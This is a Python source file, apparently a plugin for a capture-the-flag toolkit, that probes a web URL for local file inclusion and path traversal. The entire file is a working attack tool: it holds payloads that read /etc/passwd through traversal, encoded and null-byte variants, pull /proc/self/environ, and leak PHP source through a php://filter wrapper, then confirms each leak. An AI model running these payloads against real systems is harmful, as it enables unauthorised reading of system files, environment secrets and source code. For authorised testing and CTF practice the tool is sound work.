"""Local File Inclusion / path traversal probe."""

from __future__ import annotations

import argparse
import re

from rich.table import Table

from syctf.core.types import ExecutionContext
from syctf.utils.net_utils import http_get

_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.MULTILINE)
_PHP_FILTER = "php://filter/convert.base64-encode/resource=index.php"

_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../etc/passwd%00",
    "/proc/self/environ",
    _PHP_FILTER,
]


def passwd_signature(text: str) -> bool:
    """True when the response looks like a leaked /etc/passwd."""

    return bool(_PASSWD_RE.search(text or ""))


class LfiProbePlugin:
    """Test a FUZZ point for path traversal / LFI reading /etc/passwd."""

    name = "lfi-probe"
    description = "LFI / path-traversal probe (etc/passwd, php filter, proc/self/environ)"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--url", required=True, help="URL with FUZZ at the file parameter")

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        template = str(args.url)
        if "FUZZ" not in template:
            context.console.print("[bold red]--url must contain FUZZ.[/bold red]")
            return 2

        timeout = max(6.0, float(getattr(context.config, "request_timeout", 12.0)))
        context.logger.info("web lfi-probe url=%s", template)
        from urllib.parse import quote

        table = Table(title="LFI probe")
        table.add_column("Payload", style="yellow")
        table.add_column("Result", style="white")
        hit = False
        for payload in _PAYLOADS:
            resp = http_get(template.replace("FUZZ", quote(payload, safe="/%:.")), timeout=timeout)
            if resp is None:
                table.add_row(payload, "error")
                continue
            if passwd_signature(resp.text):
                hit = True
                table.add_row(payload, "[green]LEAKED /etc/passwd[/green]")
                context.cache["lfi_payload"] = payload
            elif payload == _PHP_FILTER and re.fullmatch(r"[A-Za-z0-9+/=\s]{40,}", (resp.text or "").strip() or "x"):
                table.add_row(payload, "[green]base64 source leaked (php filter)[/green]")
                hit = True
            else:
                table.add_row(payload, "no")

        context.console.print(table)
        if hit:
            context.console.print("[bold green]LFI confirmed.[/bold green]")
        return 0


plugin = LfiProbePlugin()
